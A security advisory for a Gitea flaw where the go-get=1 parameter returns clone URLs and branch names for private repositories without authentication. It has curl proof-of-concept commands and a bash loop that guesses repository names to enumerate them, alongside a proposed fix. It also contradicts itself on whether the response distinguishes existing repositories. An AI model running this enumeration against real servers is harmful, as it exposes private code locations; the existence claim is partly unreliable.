# [M] Gitea: Private Repository Existence Disclosure via go-get Meta Endpoint

## Summary
Severity: Medium
Advisory: GHSA-p4mj-98mv-xq26
CVE: CVE-2026-58507
CWE: CWE-200, CWE-284
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-p4mj-98mv-xq26
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
| Field | Value |
|-------|-------|
| **Affected File** | `routers/web/repo/githttp.go`, `services/context/repo.go` |
| **Affected Functions** | `httpBase()`, `EarlyResponseForGoGetMeta()` |
| **Affected Lines** | `githttp.go:63–66`, `services/context/repo.go:374–396` |
| **Prerequisite** | None — fully unauthenticated |

---

#### Description

Gitea implements a special behavior for requests containing the `?go-get=1` query parameter. This parameter is sent by the Go toolchain (`go get`, `go install`) to discover VCS metadata for module imports. When Gitea detects this parameter in the HTTP request path for a repository, it bypasses the normal authentication and authorization stack and returns an HTTP 200 response containing `<meta name="go-import">` and `<meta name="go-source">` tags — regardless of whether:

- The repository is private
- The requesting user is authenticated
- The requesting user has any permission on the repository

The entry point is `routers/web/repo/githttp.go:63–66`:

```go
func httpBase(ctx *context.Context, optGitService ...string) *serviceHandler {
    reponame := strings.TrimSuffix(ctx.PathParam("reponame"), ".git")

    if ctx.FormString("go-get") == "1" {
        context.EarlyResponseForGoGetMeta(ctx)
        return nil   // ← returns before any auth or permission check
    }
    ...
```

The `EarlyResponseForGoGetMeta` function (`services/context/repo.go:379–396`) is called unconditionally, and the function's own docstring documents the intended behavior:

```go
// EarlyResponseForGoGetMeta responses appropriate go-get meta with status 200
// if user does not have actual access to the requested repository,
// or the owner or repository does not exist at all.
// This is particular a workaround for "go get" command which does not respect
// .netrc file.
func EarlyResponseForGoGetMeta(ctx *Context) {
    username := ctx.PathParam("username")
    reponame := strings.TrimSuffix(ctx.PathParam("reponame"), ".git")
    ...
    ctx.PlainText(http.StatusOK, htmlMeta)   // ← HTTP 200, no auth check
}
```

The function also appears at `services/context/repo.go:444, 516, 571` — all repository-scoped route handlers that check `?go-get=1` and call `EarlyResponseForGoGetMeta` before performing any permission verification.

The metadata returned includes:

1. The **full repository name** and owner — confirming the repository exists
2. The **HTTP clone URL** — a fully-formed URL pointing to the repository
3. The **source browsing URL templates** — which may reveal the default branch name

This allows an unauthenticated attacker to:

1. **Confirm existence** of any private repository by name
2. **Enumerate** private repository names through brute-force without triggering authentication failures
3. **Harvest** clone URLs and default branch names of private repositories

---

#### Proof of Concept

**Step 1 — Identify a private repository**

Any private repository works. For this demonstration, `admin/classified-internal` is set to private:

---

**Step 2 — Confirm access is denied without authentication**

Standard requests to a private repository correctly return 404 for unauthenticated users.

---

**Step 3 — Bypass using go-get parameter**

```bash
curl -s "http://localhost:3000/admin/classified-internal?go-get=1"
```

**Actual response (HTTP 200):**

```html
<!doctype html>
<html>
    <head>
        <meta name="go-import"
              content="localhost:3000/admin/classified-internal
                       git
                       http://localhost:3000/admin/classified-internal.git">
        <meta name="go-source"
              content="localhost:3000/admin/classified-internal
                       _
                       http://localhost:3000/admin/classified-internal/src/branch/main{/dir}
                       http://localhost:3000/admin/classified-internal/src/branch/main{/dir}/{file}#L{line}">
    </head>
    <body>
        go get --insecure localhost:3000/admin/classified-internal
    </body>
</html>
```

The response:
- Returns HTTP **200** (not 404) — confirming the repository **exists**
- Reveals the **full clone URL**: `http://localhost:3000/admin/classified-internal.git`
- Reveals the **default branch name**: `main`
- Reveals the **owner username**: `admin`

This same response is returned whether or not the repository exists — the comment in `EarlyResponseForGoGetMeta` states it responds identically for both — however in practice, the clone URL generated will be functionally different (a real clone attempt against a non-existent repo fails, while one against a private repo fails only at authentication). An attacker can differentiate using response timing or by attempting `git ls-remote`.

---

**Step 4 — Enumerate private repositories at scale**

```bash
# Enumerate private repos by guessing common names
for name in internal deploy secrets infra api-keys prod-config db-creds; do
  response=$(curl -s "http://localhost:3000/admin/${name}?go-get=1")
  if echo "$response" | grep -q "go-import"; then
    clone_url=$(echo "$response" | grep -oP 'git http://\K[^ "]+')
    echo "[FOUND] admin/${name} → clone: http://${clone_url}"
  fi
done
```

---

**Step 5 — Verify the same applies to the main web router**

The vulnerability also exists via the standard web router for repository pages:

```bash
# Works on any repo-scoped URL
curl -s "http://localhost:3000/admin/classified-internal/releases?go-get=1" | grep "go-import"
curl -s "http://localhost:3000/admin/classified-internal/issues?go-get=1"   | grep "go-import"
```

All return HTTP 200 with the metadata.

---

#### Impact Analysis

**Direct impact:**

| What is leaked | Sensitivity |
|----------------|-------------|
| Repository exists | Confirms presence of private infrastructure code, internal tooling, unreleased products |
| Owner / organization name | Reveals organizational structure |
| Clone URL | Provides a direct endpoint for credential-stuffing attacks against git HTTP endpoint |
| Default branch name | Reduces brute-force surface for subsequent attacks |

---

#### Root Cause Analysis

The bypass was introduced intentionally as a workaround for the Go toolchain's limitation of not reading `.netrc` credentials before deciding whether a module is accessible. The Go `go get` command probes the VCS endpoint without credentials first; if it gets a 404, it treats the module as non-existent and fails immediately without prompting for credentials.

The workaround — returning metadata unconditionally — was the path of least resistance for enabling private module imports. The unintended consequence is that it creates an unauthenticated information disclosure endpoint for every repository in the instance.

---

#### Recommended Fix

The fix requires differentiating between requests that carry authentication credentials and those that do not, before calling `EarlyResponseForGoGetMeta`.

```go
// routers/web/repo/githttp.go:63–66 — proposed fix

if ctx.FormString("go-get") == "1" {
    // For public repos, always respond to support the go toolchain
    if repo != nil && !repo.IsPrivate {
        context.EarlyResponseForGoGetMeta(ctx)
        return nil
    }
    // For private repos, only respond if the user is authenticated
    // and has at least read access
    if ctx.IsSigned {
        if perm, err := access_model.GetDoerRepoPermission(ctx, repo, ctx.Doer); err == nil {
            if perm.CanRead(unit.TypeCode) {
                context.EarlyResponseForGoGetMeta(ctx)
                return nil
            }
        }
    }
    // Unauthenticated request for a private repo — return 404 consistent
    // with normal behavior; the go toolchain will prompt for credentials
    ctx.PlainText(http.StatusNotFound, "Repository not found")
    return nil
}
```

This approach preserves the go-get functionality for public repositories while protecting private ones. The Go toolchain will fall back to prompting for credentials when it receives a 404, which is the correct behavior for private module imports.

---

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-p4mj-98mv-xq26
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
